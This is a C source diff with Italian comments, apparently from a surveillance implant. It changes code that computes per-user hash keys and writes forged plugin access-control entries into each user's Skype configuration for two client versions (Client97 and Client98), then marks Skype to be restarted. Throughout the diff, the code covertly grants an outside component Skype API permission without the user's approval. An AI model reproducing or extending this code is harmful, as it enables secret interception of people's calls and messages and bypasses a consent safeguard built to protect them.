@@ -2007,7 +2007,7 @@ BOOL IsACLPresent(WCHAR *config_path, char *m_key1, char *m_key2, char *m_key3, 
 }
 
 // Scriva la nostra ACL nel file di config
-BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char *key4, char *path)
+BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char *key4, char *path, BOOL isOld)
 {
 	HANDLE hFile;
 	HANDLE hMap;
@@ -2074,7 +2074,10 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 		WriteFile(hFile, "<C>\r\n", strlen("<C>\r\n"), &dummy, NULL);
 	if (acl_missing)
 		WriteFile(hFile, "<AccessControlList>\r\n", strlen("<AccessControlList>\r\n"), &dummy, NULL);
-	WriteFile(hFile, "<Client98>\r\n<Key1>", strlen("<Client98>\r\n<Key1>"), &dummy, NULL);
+	if (isOld)
+		WriteFile(hFile, "<Client97>\r\n<Key1>", strlen("<Client97>\r\n<Key1>"), &dummy, NULL);
+	else
+		WriteFile(hFile, "<Client98>\r\n<Key1>", strlen("<Client98>\r\n<Key1>"), &dummy, NULL);
 	WriteFile(hFile, key1, strlen(key1), &dummy, NULL);
 	WriteFile(hFile, "</Key1>\r\n", strlen("</Key1>\r\n"), &dummy, NULL);
 	WriteFile(hFile, "<Key2>", strlen("<Key2>"), &dummy, NULL);
@@ -2088,7 +2091,10 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	WriteFile(hFile, "</Key4>\r\n", strlen("</Key4>\r\n"), &dummy, NULL);
 	WriteFile(hFile, "<Path>", strlen("<Path>"), &dummy, NULL);
 	WriteFile(hFile, path, strlen(path), &dummy, NULL);
-	WriteFile(hFile, "</Path>\r\n</Client98>\r\n", strlen("</Path>\r\n</Client98>\r\n"), &dummy, NULL);
+	if (isOld)
+		WriteFile(hFile, "</Path>\r\n</Client97>\r\n", strlen("</Path>\r\n</Client97>\r\n"), &dummy, NULL);
+	else
+		WriteFile(hFile, "</Path>\r\n</Client98>\r\n", strlen("</Path>\r\n</Client98>\r\n"), &dummy, NULL);
 	if (acl_missing)
 		WriteFile(hFile, "</AccessControlList>\r\n", strlen("</AccessControlList>\r\n"), &dummy, NULL);
 	if (c_missing)
@@ -2106,8 +2112,8 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	return TRUE;
 }
 
-extern BOOL SkypeACLKeyGen(char *lpUserName, char *lpFileName, char *lpOutKey1, char *lpOutKey2, char *lpOutKey3, char *lpOutKey4, char *lpOutPath);
-BOOL CalculateUserHash(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
+extern BOOL SkypeACLKeyGen(char *lpUserName, char *lpFileName, char *lpOutKey1, char *lpOutKey2, char *lpOutKey3, char *lpOutKey4, char *lpOutPath, BOOL isOld);
+BOOL CalculateUserHash(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path, BOOL isOld)
 {
 	char c_user_name[MAX_PATH];
 	char c_file_path[MAX_PATH];
@@ -2121,11 +2127,11 @@ BOOL CalculateUserHash(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m
 	ZeroMemory(m_key4, MAX_HASHKEY_LEN);
 	ZeroMemory(m_path, MAX_HASHKEY_LEN);
 
-	return SkypeACLKeyGen(c_user_name, c_file_path, m_key1, m_key2, m_key3, m_key4, m_path);
+	return SkypeACLKeyGen(c_user_name, c_file_path, m_key1, m_key2, m_key3, m_key4, m_path, isOld);
 }
 
 // Cerca (e in caso fa calcolare) gli hash corretti relativi ad un particolare utente
-BOOL FindHashKeys(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
+BOOL FindHashKeys(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path, BOOL isOld)
 {
 	typedef struct {
 		WCHAR user_name[MAX_PATH];
@@ -2136,35 +2142,64 @@ BOOL FindHashKeys(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2
 		char m_path[MAX_HASHKEY_LEN];
 	} user_hash_struct;
 
-	static user_hash_struct *user_hash_array = NULL;
-	static DWORD user_hash_size = 0;
+	static user_hash_struct *user_hash_array_old = NULL;
+	static DWORD user_hash_size_old = 0;
+	static user_hash_struct *user_hash_array_new = NULL;
+	static DWORD user_hash_size_new = 0;
+
 	user_hash_struct *tmp_ptr = NULL;
 	DWORD i;
 
-	for (i=0; i<user_hash_size && user_hash_array; i++) {
-		if (!wcscmp(user_hash_array[i].user_name, user_name)) {
-			memcpy(m_key1, user_hash_array[i].m_key1, MAX_HASHKEY_LEN);
-			memcpy(m_key2, user_hash_array[i].m_key2, MAX_HASHKEY_LEN);
-			memcpy(m_key3, user_hash_array[i].m_key3, MAX_HASHKEY_LEN);
-			memcpy(m_key4, user_hash_array[i].m_key4, MAX_HASHKEY_LEN);
-			memcpy(m_path, user_hash_array[i].m_path, MAX_HASHKEY_LEN);
-			return TRUE;
+	if (isOld) {
+		for (i=0; i<user_hash_size_old && user_hash_array_old; i++) {
+			if (!wcscmp(user_hash_array_old[i].user_name, user_name)) {
+				memcpy(m_key1, user_hash_array_old[i].m_key1, MAX_HASHKEY_LEN);
+				memcpy(m_key2, user_hash_array_old[i].m_key2, MAX_HASHKEY_LEN);
+				memcpy(m_key3, user_hash_array_old[i].m_key3, MAX_HASHKEY_LEN);
+				memcpy(m_key4, user_hash_array_old[i].m_key4, MAX_HASHKEY_LEN);
+				memcpy(m_path, user_hash_array_old[i].m_path, MAX_HASHKEY_LEN);
+				return TRUE;
+			}
+		}
+	} else {
+		for (i=0; i<user_hash_size_new && user_hash_array_new; i++) {
+			if (!wcscmp(user_hash_array_new[i].user_name, user_name)) {
+				memcpy(m_key1, user_hash_array_new[i].m_key1, MAX_HASHKEY_LEN);
+				memcpy(m_key2, user_hash_array_new[i].m_key2, MAX_HASHKEY_LEN);
+				memcpy(m_key3, user_hash_array_new[i].m_key3, MAX_HASHKEY_LEN);
+				memcpy(m_key4, user_hash_array_new[i].m_key4, MAX_HASHKEY_LEN);
+				memcpy(m_path, user_hash_array_new[i].m_path, MAX_HASHKEY_LEN);
+				return TRUE;
+			}
 		}
 	}
 
-	if (!CalculateUserHash(user_name, file_path, m_key1, m_key2, m_key3, m_key4, m_path))
+	if (!CalculateUserHash(user_name, file_path, m_key1, m_key2, m_key3, m_key4, m_path, isOld))
 		return FALSE;
 
-	if ( !(tmp_ptr = (user_hash_struct *)realloc(user_hash_array, (user_hash_size+1)*sizeof(user_hash_struct))) )
-		return TRUE;
-	user_hash_array = tmp_ptr;
-	memcpy(user_hash_array[user_hash_size].user_name, user_name, sizeof(user_hash_array[user_hash_size].user_name));
-	memcpy(user_hash_array[user_hash_size].m_key1, m_key1, sizeof(user_hash_array[user_hash_size].m_key1));
-	memcpy(user_hash_array[user_hash_size].m_key2, m_key2, sizeof(user_hash_array[user_hash_size].m_key2));
-	memcpy(user_hash_array[user_hash_size].m_key3, m_key3, sizeof(user_hash_array[user_hash_size].m_key3));
-	memcpy(user_hash_array[user_hash_size].m_key4, m_key4, sizeof(user_hash_array[user_hash_size].m_key4));
-	memcpy(user_hash_array[user_hash_size].m_path, m_path, sizeof(user_hash_array[user_hash_size].m_path));
-	user_hash_size++;
+	if (isOld) {
+		if ( !(tmp_ptr = (user_hash_struct *)realloc(user_hash_array_old, (user_hash_size_old+1)*sizeof(user_hash_struct))) )
+			return TRUE;
+		user_hash_array_old = tmp_ptr;
+		memcpy(user_hash_array_old[user_hash_size_old].user_name, user_name, sizeof(user_hash_array_old[user_hash_size_old].user_name));
+		memcpy(user_hash_array_old[user_hash_size_old].m_key1, m_key1, sizeof(user_hash_array_old[user_hash_size_old].m_key1));
+		memcpy(user_hash_array_old[user_hash_size_old].m_key2, m_key2, sizeof(user_hash_array_old[user_hash_size_old].m_key2));
+		memcpy(user_hash_array_old[user_hash_size_old].m_key3, m_key3, sizeof(user_hash_array_old[user_hash_size_old].m_key3));
+		memcpy(user_hash_array_old[user_hash_size_old].m_key4, m_key4, sizeof(user_hash_array_old[user_hash_size_old].m_key4));
+		memcpy(user_hash_array_old[user_hash_size_old].m_path, m_path, sizeof(user_hash_array_old[user_hash_size_old].m_path));
+		user_hash_size_old++;
+	} else {
+		if ( !(tmp_ptr = (user_hash_struct *)realloc(user_hash_array_new, (user_hash_size_new+1)*sizeof(user_hash_struct))) )
+			return TRUE;
+		user_hash_array_new = tmp_ptr;
+		memcpy(user_hash_array_new[user_hash_size_new].user_name, user_name, sizeof(user_hash_array_new[user_hash_size_new].user_name));
+		memcpy(user_hash_array_new[user_hash_size_new].m_key1, m_key1, sizeof(user_hash_array_new[user_hash_size_new].m_key1));
+		memcpy(user_hash_array_new[user_hash_size_new].m_key2, m_key2, sizeof(user_hash_array_new[user_hash_size_new].m_key2));
+		memcpy(user_hash_array_new[user_hash_size_new].m_key3, m_key3, sizeof(user_hash_array_new[user_hash_size_new].m_key3));
+		memcpy(user_hash_array_new[user_hash_size_new].m_key4, m_key4, sizeof(user_hash_array_new[user_hash_size_new].m_key4));
+		memcpy(user_hash_array_new[user_hash_size_new].m_path, m_path, sizeof(user_hash_array_new[user_hash_size_new].m_path));
+		user_hash_size_new++;
+	}
 
 	return TRUE;
 }
@@ -2181,6 +2216,7 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 	HANDLE hFind, hSkype, hFile;
 	BOOL is_to_respawn = FALSE;
 	char m_key1[MAX_HASHKEY_LEN], m_key2[MAX_HASHKEY_LEN], m_key3[MAX_HASHKEY_LEN], m_key4[MAX_HASHKEY_LEN], m_path[MAX_HASHKEY_LEN];
+	BOOL missing_acl1 = FALSE, missing_acl2 = FALSE;
 
 	// Trova il path di %appdata%\Skype
 	if(!FNC(GetEnvironmentVariableW)(L"appdata", skype_data, MAX_PATH)) 
@@ -2205,10 +2241,27 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 				continue;
 			CloseHandle(hFile);
 			// Verifica se contiene gia' la permission altrimenti la scrive
-			if (FindHashKeys(find_data.cFileName, core_path, m_key1, m_key2, m_key3, m_key4, m_path))
+			missing_acl1 = FALSE;
+			missing_acl2 = FALSE;
+			
+			if (FindHashKeys(find_data.cFileName, core_path, m_key1, m_key2, m_key3, m_key4, m_path, FALSE))
 				if (!IsACLPresent(config_path, m_key1, m_key2, m_key3, m_key4, m_path))
-					if (WriteSkypeACL(config_path, m_key1, m_key2, m_key3, m_key4, m_path))
+					missing_acl1 = TRUE;			
+
+			if (FindHashKeys(find_data.cFileName, core_path, m_key1, m_key2, m_key3, m_key4, m_path, TRUE)) 
+				if (!IsACLPresent(config_path, m_key1, m_key2, m_key3, m_key4, m_path))
+					missing_acl2 = TRUE;
+
+			if (missing_acl1 && missing_acl2) {
+				if (FindHashKeys(find_data.cFileName, core_path, m_key1, m_key2, m_key3, m_key4, m_path, FALSE))
+					if (WriteSkypeACL(config_path, m_key1, m_key2, m_key3, m_key4, m_path, TRUE)) {
 						is_to_respawn = TRUE;
+					}
+				if (FindHashKeys(find_data.cFileName, core_path, m_key1, m_key2, m_key3, m_key4, m_path, TRUE)) 
+					if (WriteSkypeACL(config_path, m_key1, m_key2, m_key3, m_key4, m_path, FALSE)) {
+						is_to_respawn = TRUE;
+					}
+			}
 		}
 	} while (FNC(FindNextFileW)(hFind, &find_data));
 	FNC(FindClose)(hFind);
